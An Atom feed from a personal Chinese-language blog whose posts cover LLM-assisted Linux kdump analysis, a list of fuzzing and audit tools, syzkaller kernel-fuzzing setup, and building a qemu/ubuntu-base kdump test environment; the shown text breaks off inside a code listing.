<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Hexo</title>
  
  
  <link href="https://zjw1nd.github.io/atom.xml" rel="self"/>
  
  <link href="https://zjw1nd.github.io/"/>
  <updated>2025-04-05T09:21:25.352Z</updated>
  <id>https://zjw1nd.github.io/</id>
  
  <author>
    <name>John Doe</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>基于LLM的kdump分析开发日志（持续更新）</title>
    <link href="https://zjw1nd.github.io/2025/04/05/%E5%9F%BA%E4%BA%8ELLM%E7%9A%84kdump%E5%88%86%E6%9E%90%E5%BC%80%E5%8F%91%E6%97%A5%E5%BF%97%EF%BC%88%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0%EF%BC%89/"/>
    <id>https://zjw1nd.github.io/2025/04/05/%E5%9F%BA%E4%BA%8ELLM%E7%9A%84kdump%E5%88%86%E6%9E%90%E5%BC%80%E5%8F%91%E6%97%A5%E5%BF%97%EF%BC%88%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0%EF%BC%89/</id>
    <published>2025-04-05T08:25:02.000Z</published>
    <updated>2025-04-05T09:21:25.352Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>最近更新2025-04-05，基于ChatDBG和kdump-gdbserver实现了python便利地获取调试信息。</p></blockquote><h1>环境搭建</h1><p>参考<a href="https://zjw1nd.github.io/2025/03/21/%E5%9F%BA%E4%BA%8Eqemu%E5%92%8Cubuntu-base%E7%9A%84kdump%E5%88%86%E6%9E%90%E7%8E%AF%E5%A2%83/">这里</a>\</p><h1>Kdump的分析流程</h1><p>我对于AI相关的技术包括Agent之类一窍不通，所以先来看我熟悉的领域，内核的调试与分析。</p><blockquote><p><a href="https://www.cnblogs.com/muahao/p/7452737.html">https://www.cnblogs.com/muahao/p/7452737.html</a></p></blockquote><p>“LLM分析崩溃转储现场”这件事有开源项目在做，<a href="https://github.com/plasma-umass/ChatDBG">ChatDBG</a>就是一个例子。我先读了下这个项目的源码。更多的内容就不赘述，它是以gdb/pdb/lldb相关插件的形式工作的，以熟悉的gdb为例。它实现了一个&quot;why&quot;命令让LLM分析崩溃或者相关现场原因。</p><h2 id="ChatDBG的实现">ChatDBG的实现</h2><p>总体的思路是将相关的信息打包成结构化的数据发给LLM:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">build_initial_prompt</span>(<span class="params"></span></span><br><span class="line"><span class="params">    stack: <span class="built_in">str</span>,</span></span><br><span class="line"><span class="params">    error: <span class="built_in">str</span>,</span></span><br><span class="line"><span class="params">    details: <span class="built_in">str</span>,</span></span><br><span class="line"><span class="params">    command_line: <span class="built_in">str</span>,</span></span><br><span class="line"><span class="params">    inputs: <span class="built_in">str</span>,</span></span><br><span class="line"><span class="params">    history: <span class="built_in">str</span>,</span></span><br><span class="line"><span class="params">    extra: <span class="built_in">str</span> = <span class="string">&quot;&quot;</span>,</span></span><br><span class="line"><span class="params">    user_text: <span class="built_in">str</span> = <span class="string">&quot;&quot;</span>,</span></span><br><span class="line"><span class="params"></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    <span class="keyword">return</span> _concat_prompt(</span><br><span class="line">        _wrap_it(<span class="string">&quot;The program has this stack trace&quot;</span>, stack),</span><br><span class="line">        _wrap_it(<span class="string">&quot;The program encountered the following error&quot;</span>, error, details),</span><br><span class="line">        _wrap_it(<span class="string">&quot;This was the command line&quot;</span>, command_line),</span><br><span class="line">        _wrap_it(<span class="string">&quot;This was the program&#x27;s input&quot;</span>, inputs),</span><br><span class="line">        _wrap_it(<span class="string">&quot;This is the history of some debugger commands I ran&quot;</span>, history),</span><br><span class="line">        _wrap_it(<span class="string">&quot;&quot;</span>, extra),</span><br><span class="line">        _user_text_it(user_text),</span><br><span class="line">    )</span><br></pre></td></tr></table></figure><p>这些传入的参数取决于各个调试器类自己的实现。对于gdb，其他的都好说，主要核心内容是它通过gdb-python接口对堆栈做了回溯，并且提取了对应的调试信息，将最顶部的三个堆栈处对应的上下十行的源代码加了行号之后都打包发给LLM。</p><p><strong>核心的思路就是想办法将人做的东西用代码自动化获取，结构化打包发给LLM，让它吐东西出来</strong></p><h2 id="问题">问题</h2><p>首先，gdb只支持ELF格式的镜像，需要对makedumpfile做一些配置。其对于地址的映射关系写在ELF头的LOAD字段里面。但是vmcore是按照物理地址映射的，在关闭kaslr的情况下，ELF头中只有直接映射地址区域的内容，而没有vmalloc相关的地址。内核如果使用vmalloc，尤其是用vmalloc分配栈，这会导致我们的栈地址无法访问。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#0  0xffffffff811d440b in crash_setup_regs (newregs=0xffffc900003cfd18, oldregs=0x0 &lt;fixed_percpu_data&gt;) at ./arch/x86/include/asm/kexec.h:111</span><br><span class="line">#1  __crash_kexec (regs=0x0 &lt;fixed_percpu_data&gt;) at kernel/crash_core.c:119</span><br><span class="line">Backtrace stopped: Cannot access memory at address 0xffffc900003cfdd0</span><br></pre></td></tr></table></figure><p>crash虽然没有这个问题，但是其操作很复杂且没有封装的api，模拟终端操作会很呆而且其不支持读取vmlinux的调试信息，要想把堆栈地址和源码对应，需要做单独的处理和转换，到时候还需要建立联系，非常麻烦。</p><p>以我个人的经验来说，想办法让gdb能够调试vmcore，然后用gdb-python api会比后者方便很多。我甚至考虑过修改vmcore的文件头，但是这更麻烦，并且每个dump文件都要重复。在目前我考虑头痛医头脚痛医脚的方法，在内核编译选项里关闭了<code>CONFIG_VMAP_STACK</code>，让内核栈不用vmalloc去分配，这样<em>暂时性地</em>解决了gdb无法读取内核栈地址的问题。然后采用gdb-python的api去回溯堆栈就可以了。</p><p>后续我发现了一个相关的库，有人以lib的形式实现了一个<a href="https://github.com/ptesarik/libkdumpfile">libkdumpfile</a>并提供了pykdumpfile的api，安装之后就可以用这套api在python解析vmcore文件而不用单独操作crash了。同时，这里还有一个用CS结构思想实现的<a href="https://github.com/ptesarik/kdump-gdbserver">kdump-gdbserver</a>,它能通过建立一个远程调试服务器的方法让gdb去attach vmcore，而且代码很轻量（建立在pykdumpfile的基础上）。</p><p>这无疑成为了我们的首选，经过<strong>不懈地测试</strong>，我<em>暂时</em>跑通了这玩意，并且测试成功，能够靠gdb命令来获取内核崩溃现场的堆栈信息了。说暂时是因为这个项目提供的gdb命令还是存在问题，没办法很好地分析现场的其他线程/任务，但是目前不太需要这些信息。</p><blockquote><p>甚至神智不清到将vmlinux和vmcore匹配错了还认真提了个issue给人家发邮件orz，Peter老哥人很好，专门回复了我</p></blockquote><h1>更好，更智能，更符合人类思维的检索方式——AST</h1><p>文件路径获取还是比较僵硬的，下一步我们要为linux内核构建一个能够利用代码本身的依赖关系做查找的东西，利用AST。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;最近更新2025-04-05，基于ChatDBG和kdump-gdbserver实现了python便利地获取调试信息。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h1&gt;环境搭建&lt;/h1&gt;
&lt;p&gt;参考&lt;a href=&quot;https://zjw1nd.git</summary>
      
    
    
    
    <category term="others" scheme="https://zjw1nd.github.io/categories/others/"/>
    
    
    <category term="kernel" scheme="https://zjw1nd.github.io/tags/kernel/"/>
    
    <category term="develop" scheme="https://zjw1nd.github.io/tags/develop/"/>
    
  </entry>
  
  <entry>
    <title>漏洞挖掘入门（持续更新）</title>
    <link href="https://zjw1nd.github.io/2025/03/28/SRC%E4%B8%8E%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E5%85%A5%E9%97%A8%EF%BC%88%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0%EF%BC%89/"/>
    <id>https://zjw1nd.github.io/2025/03/28/SRC%E4%B8%8E%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E5%85%A5%E9%97%A8%EF%BC%88%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0%EF%BC%89/</id>
    <published>2025-03-28T09:10:24.000Z</published>
    <updated>2025-03-28T09:27:59.053Z</updated>
    
    <content type="html"><![CDATA[<h1>Fuzz</h1><p>Syzkaller 各种内核fuzz<br>afl++<br>libfuzzer</p><h1>自动化（静态）</h1><p>Ghidra10.1.2 binabsinspector插件，科恩的</p><h1>Web漏扫</h1><p>msf</p><h1>代码审计</h1><p>Fortify<br>CodeQL</p><h1>数据库</h1><p>参考github star内容现场搜索</p><p>Squirrel C++数万行（）<br>sqlfuzz…</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1&gt;Fuzz&lt;/h1&gt;
&lt;p&gt;Syzkaller 各种内核fuzz&lt;br&gt;
afl++&lt;br&gt;
libfuzzer&lt;/p&gt;
&lt;h1&gt;自动化（静态）&lt;/h1&gt;
&lt;p&gt;Ghidra10.1.2 binabsinspector插件，科恩的&lt;/p&gt;
&lt;h1&gt;Web漏扫&lt;/h1&gt;
&lt;p</summary>
      
    
    
    
    <category term="Exploits" scheme="https://zjw1nd.github.io/categories/Exploits/"/>
    
    
    <category term="pwn" scheme="https://zjw1nd.github.io/tags/pwn/"/>
    
    <category term="web" scheme="https://zjw1nd.github.io/tags/web/"/>
    
    <category term="fuzz" scheme="https://zjw1nd.github.io/tags/fuzz/"/>
    
  </entry>
  
  <entry>
    <title>内核fuzzing--Syzkaller初探</title>
    <link href="https://zjw1nd.github.io/2025/03/24/%E5%86%85%E6%A0%B8fuzzing-Syzkaller%E5%88%9D%E6%8E%A2/"/>
    <id>https://zjw1nd.github.io/2025/03/24/%E5%86%85%E6%A0%B8fuzzing-Syzkaller%E5%88%9D%E6%8E%A2/</id>
    <published>2025-03-24T08:33:28.000Z</published>
    <updated>2025-03-30T08:01:26.347Z</updated>
    
    <content type="html"><![CDATA[<h1>环境配置</h1><h2 id="内核编译">内核编译</h2><p>内核需要开启的选项：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">CONFIG_KCOV=y</span><br><span class="line">CONFIG_DEBUG_INFO=y # 其他的debug信息可以自行选择</span><br><span class="line">CONFIG_KASAN=y</span><br><span class="line">CONFIG_KASAN_INLINE=y</span><br><span class="line"># 不开下面的这俩qemu中systemd会报错挂不上文件系统</span><br><span class="line">CONFIG_CONFIGFS_FS=y</span><br><span class="line">CONFIG_SECURITYFS=y</span><br><span class="line"># 内置cmdline解决没网卡/无法联网的问题，也可以在syz-manager的cfg文件里配置</span><br><span class="line">CONFIG_CMDLINE_BOOL=y</span><br><span class="line">CONFIG_CMDLINE=&quot;net.ifnames=0&quot;</span><br></pre></td></tr></table></figure><h2 id="disk-image">disk image</h2><p>disk image用官方提供的脚本，当然又有挂载相关的问题，有了上次的经验直接用docker跑应该就行。</p><h2 id="fuzz跑不动">fuzz跑不动</h2><p>连不上机器，查看日志说是fuzz执行syz-executor的时候segfault，gdb调了以下看了眼backtrace，pie的问题？这玩意不是静态编译的吗？遂上网搜索</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[  451.736541] syz-executor[249]: segfault at 7f6b8b5df3f8 ip 00007f6b8bb6b090 sp 00007ffde599aaa0 error 4 in syz-executor[7f6b8b9e7000+1]</span><br><span class="line">[  451.738294] Code: 08 66 0f d4 c1 4c 8b 51 08 66 49 0f 7e c0 4b 8d 0c 2a 4c 0f 45 d1 48 39 d8 73 3b 66 66 2e 0f 1f 84 00 00 00 00 00 0fb</span><br><span class="line">Segmentation fault</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">──────────────────────────[ DISASM / x86-64 / set emulate on ]───────────────────────────</span><br><span class="line"> ► 0x7ffff71cc090 &lt;_dl_relocate_static_pie+1040&gt;    mov    rcx, qword ptr [rax]         &lt;Cannot dereference [0x7ffff6c403f8]&gt;</span><br><span class="line">   0x7ffff71cc093 &lt;_dl_relocate_static_pie+1043&gt;    mov    edx, dword ptr [rax + 8]</span><br><span class="line">   0x7ffff71cc096 &lt;_dl_relocate_static_pie+1046&gt;    add    rcx, r13</span><br><span class="line">   0x7ffff71cc099 &lt;_dl_relocate_static_pie+1049&gt;    cmp    rdx, 0x26</span><br><span class="line">   0x7ffff71cc09d &lt;_dl_relocate_static_pie+1053&gt;    je     _dl_relocate_static_pie+1065 &lt;_dl_relocate_static_pie+1065&gt;</span><br><span class="line"> </span><br><span class="line">   0x7ffff71cc09f &lt;_dl_relocate_static_pie+1055&gt;    cmp    rdx, 8</span><br><span class="line">   0x7ffff71cc0a3 &lt;_dl_relocate_static_pie+1059&gt;    jne    _dl_relocate_static_pie.cold+62 &lt;_dl_relocate_static_pie.cold+62&gt;</span><br><span class="line"> </span><br><span class="line">   0x7ffff71cc0a9 &lt;_dl_relocate_static_pie+1065&gt;    mov    rdx, qword ptr [rax + 0x10]</span><br><span class="line">   0x7ffff71cc0ad &lt;_dl_relocate_static_pie+1069&gt;    add    rax, 0x18</span><br><span class="line">   0x7ffff71cc0b1 &lt;_dl_relocate_static_pie+1073&gt;    add    rdx, r13</span><br><span class="line">   0x7ffff71cc0b4 &lt;_dl_relocate_static_pie+1076&gt;    mov    qword ptr [rcx], rdx</span><br><span class="line">────────────────────────────────────────[ STACK ]────────────────────────────────────────</span><br><span class="line">00:0000│ rsp 0x7fffffffde30 ◂— 0x40 /* &#x27;@&#x27; */</span><br><span class="line">01:0008│-0a8 0x7fffffffde38 ◂— 0xa /* &#x27;\n&#x27; */</span><br><span class="line">02:0010│-0a0 0x7fffffffde40 ◂— 0xffffffffffffffff</span><br><span class="line">03:0018│-098 0x7fffffffde48 ◂— 0x100</span><br><span class="line">04:0020│-090 0x7fffffffde50 ◂— 0x800</span><br><span class="line">05:0028│-088 0x7fffffffde58 ◂— 0x1940000</span><br><span class="line">06:0030│-080 0x7fffffffde60 —▸ 0x7fffffffdeb0 ◂— 0</span><br><span class="line">07:0038│-078 0x7fffffffde68 —▸ 0x7fffffffde98 ◂— 0</span><br><span class="line">──────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────</span><br><span class="line"> ► 0   0x7ffff71cc090 _dl_relocate_static_pie+1040</span><br><span class="line">   1   0x7ffff7146cb6 __libc_start_main_impl+102</span><br><span class="line">   2   0x7ffff7050885 _start+37</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>结果还真让我搜到了：<br><a href="https://sourceware.org/bugzilla/show_bug.cgi?id=32761">https://sourceware.org/bugzilla/show_bug.cgi?id=32761</a></p><p><a href="https://www.mail-archive.com/bug-binutils@gnu.org/msg49517.html">https://www.mail-archive.com/bug-binutils@gnu.org/msg49517.html</a></p><p>glibc2.41的问题，那就用我们经典的解决方案，换到docker里挂载之后重新编译syzkaller就能解决。</p><h1>用法</h1><p>用cfg文件指定我们的目标，启动syzkaller之后用web前端观察结果。</p><p>可以fuzz驱动</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1&gt;环境配置&lt;/h1&gt;
&lt;h2 id=&quot;内核编译&quot;&gt;内核编译&lt;/h2&gt;
&lt;p&gt;内核需要开启的选项：&lt;/p&gt;
&lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;</summary>
      
    
    
    
    <category term="Exploit" scheme="https://zjw1nd.github.io/categories/Exploit/"/>
    
    
    <category term="kernel" scheme="https://zjw1nd.github.io/tags/kernel/"/>
    
    <category term="fuzzing" scheme="https://zjw1nd.github.io/tags/fuzzing/"/>
    
  </entry>
  
  <entry>
    <title>基于qemu和ubuntu-base的kdump分析环境</title>
    <link href="https://zjw1nd.github.io/2025/03/21/%E5%9F%BA%E4%BA%8Eqemu%E5%92%8Cubuntu-base%E7%9A%84kdump%E5%88%86%E6%9E%90%E7%8E%AF%E5%A2%83/"/>
    <id>https://zjw1nd.github.io/2025/03/21/%E5%9F%BA%E4%BA%8Eqemu%E5%92%8Cubuntu-base%E7%9A%84kdump%E5%88%86%E6%9E%90%E7%8E%AF%E5%A2%83/</id>
    <published>2025-03-21T08:45:28.000Z</published>
    <updated>2025-03-22T07:01:36.582Z</updated>
    
    <content type="html"><![CDATA[<p>OS比赛的环境搭建折磨了我两天，因此有必要在这里记录下全过程，以后自己想用什么系统也会方便一点。而且网上的blog对于坑是只字不提啊我日。</p><p>目前能够完美运行kdump的环境，基于：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">QEMU emulator version 9.2.2</span><br><span class="line">Kernel: 6.13.7-arch1-1</span><br><span class="line">虚拟机主内核: linux-6.13.7(compiled from src)</span><br><span class="line">虚拟机副内核: linux-5.4.10</span><br><span class="line">根文件系统: UbuntuBase20.04</span><br></pre></td></tr></table></figure><h1>1. Kernel</h1><h2 id="主内核，即启动加载的内核">主内核，即启动加载的内核</h2><p>要想运行qemu-system, 首先当然需要一个自定义的内核。对于需要调试的内核，我们待会要用到核心转储文件和带有调试信息的无压缩内核，因此，从官网下载源码后，要打开这些编译选项。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">CONFIG_KEXEC=y</span><br><span class="line">CONFIG_SYSFS=y</span><br><span class="line"></span><br><span class="line">CONFIG_CRASH_DUMP=y</span><br><span class="line">CONFIG_PROC_VMCORE=y</span><br><span class="line">CONFIG_RELOCATABLE=y</span><br><span class="line"></span><br><span class="line">CONFIG_DEBUG_INFO=y</span><br><span class="line">CONFIG_DEBUG_INFO_REDUCED=n</span><br><span class="line">CONFIG_DEBUG_INFO_DWARF4=y</span><br><span class="line">CONFIG_DEBUG_FS=y # idk这个随便开的</span><br></pre></td></tr></table></figure><p>这些选项是从各种网站博客之类收集来的，我使用的build脚本是在<a href="https://github.com/pwncollege/pwnkernel">pwncollege提供的脚本</a>基础上做的修改，我也同样建议你在各种地方使用这个脚本来构建和启动内核。最终的build脚本<a href="/files/build.sh">在这里</a>。</p><h2 id="需要注意的是…">需要注意的是…</h2><p>首先，crash工具的本质是一个gdb的套壳。我的arch pacman安装的最新crash里面的gdb版本也才到7.4，所以它不支持dwarf5格式的调试信息，需要<strong>改成dwarf4</strong>，否则会报错。</p><p>其次，对于宿主机来说，如果你想编译一个比较低版本的内核，需要注意自己的gcc版本。我开始在试图编译一个ubuntu20.04的5.4.1内核的时候，会一直报错说UAF的检查不过。这种情况，你有两种选择，一是<strong>用docker（也可以试试包管理器但是有点搞）安装一个低版本的gcc环境</strong>，推荐gcc8。docker pull就可以。这之后在docker里面去编译内核。（我忘记是-v映射还是docker内clone的源码了）</p><p>二是抛弃低版本的内核，使用高版本内核，使用和你的宿主机一致的内核版本最好。当然，可能会有的问题我们后面再说。</p><h1>2. 文件镜像</h1><blockquote><p>参考 <a href="https://www.cnblogs.com/wsg1100/p/13127636.html#23">https://www.cnblogs.com/wsg1100/p/13127636.html#23</a></p></blockquote><p>由于kdump相关的工具链在ubuntu的仓库中很全而且可以apt一键安装，因此我建议基于ubuntu-base去构建rootfs。</p><p>这里我用的是ubuntu20.04的ubuntu-base。首先从<a href="https://cdimage.ubuntu.com/ubuntu-base/releases/focal/release/">官网</a>或者镜像站下载ubuntu-base的tar包，接着首先创建一个空的镜像，我使用的是qemu-img：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">qemu-img create -f raw rootfs.img 4G</span><br></pre></td></tr></table></figure><p>当然也可以用dd</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 这是10G!</span><br><span class="line">dd if=/dev/zero of=ubuntu_base.img bs=1G count=10</span><br></pre></td></tr></table></figure><p>写好后用mkfs.ext4对它进行初始化。</p><p><font color=red><b>⚠️注意！mkfs工具和内核的版本是相关的。对于新的内核其能够支持更新的ext4特性，但是这样创建的镜像会导致低版本的内核无法挂载rootfs，只能在initramfs里。这一问题我排查了很长时间才发现。如果你的宿主机内核比较新，为了避免相关情况，可以使用低版本ubuntu的docker内提供的mkfs</b></font><br>可以尝试使用<code>tune2fs -l your.img | grep Features</code>来查看相关的特性。如果你在切换内核时无法进入根文件系统并且日志中提到ext4的问题，试着用低版本的mkfs重新创建镜像。</p><blockquote><p>对于报错不支持特性的代码，可以在<a href="https://web.git.kernel.org/pub/scm/fs/ext2/e2fsprogs.git/tree/lib/ext2fs/ext2_fs.h#n810">这里</a>查看。按理说，tune2fs -O 参数可以用^feature关闭特性，但是我自己尝试的时候并不能生效。</p></blockquote><p>然后，mount上这个文件（我的系统不需要额外参数，直接sudo mount img dir就可以），将ubuntubase解压进文件夹。</p><p>接着，如果你是ubuntu系统，就可以将你自己的镜像源，dns等拷进去。但是从0开始总是好的。</p><h2 id="相关的配置">相关的配置</h2><p>apt source位于<code>/etc/apt/sources.list</code>. 在你的宿主机上改掉它，换源就不赘述了。接着是dns，这个文件则是<code>/etc/resolv.conf</code>，可以拷贝你主机的文件过去，也可以直接写入<code>nameserver 8.8.8.8</code>或114。</p><p>然后chroot进去用apt开始装东西，虚拟文件系统包括/dev, /proc这些可以不挂载，用处不大。apt warning不用管，都是日志没位置输出之类的。目前，我们的base里没有公钥，所以换源后执行update如果说没有gpg什么的，这样跑：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get udpate --allow-insecure-repositories</span><br></pre></td></tr></table></figure><p>然后直接aptinstall相应的东西，提示无认证的时候选y不要默认N直接装就行了。</p><p><strong>下面apt要装的东西很重要</strong>，少了的话后面会很痛苦。</p><p>首先配置这些：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">apt install locales language-pack-en-base</span><br><span class="line">echo &quot;LANG=en_US.UTF-8&quot; &gt; /etc/locale.conf</span><br><span class="line">echo &quot;test&quot; &gt; /etc/hostname</span><br><span class="line">apt-get install bash-completion</span><br></pre></td></tr></table></figure><p><code>/etc/hosts</code>:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1 localhost</span><br><span class="line">127.0.0.1 test</span><br><span class="line">127.0.1.1 test.localdomain test</span><br></pre></td></tr></table></figure><p>然后是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt install init vim -y</span><br></pre></td></tr></table></figure><p><font color=yellow>一定要安装init包！一定要安装init包！一定要安装init包！</font>不然你的电脑会没有reboot和shutdown命令，只能qemu关闭，kdump无法自动触发重启。</p><p>在这里可选安装/boot下的内核和initrd，如果你有自己的第二内核可以自己copy进去提供给kexec，我是使用的现成的内核和initrd。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apt install linux-image-kvm</span><br><span class="line"># （不一定是这个，可以搜索安装当前base版本或更低版本的内核和header）</span><br></pre></td></tr></table></figure><p>最后安装kdump，可以参考<a href="https://documentation.ubuntu.com/server/how-to/software/kernel-crash-dump/index.html">更详细的doc</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">apt install linux-crashdump kexec-tools crash</span><br><span class="line"># linux-crashdump: 全套，按理说装这一个就可以，包含kdump-tools，kexec-tools</span><br><span class="line"># crash: 分析工具，我建议宿主机装</span><br></pre></td></tr></table></figure><p>安装过程中会问配置，自己选即可。</p><p>这是我的base系统最终<code>apt list --installed</code>的结果，供参考：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span 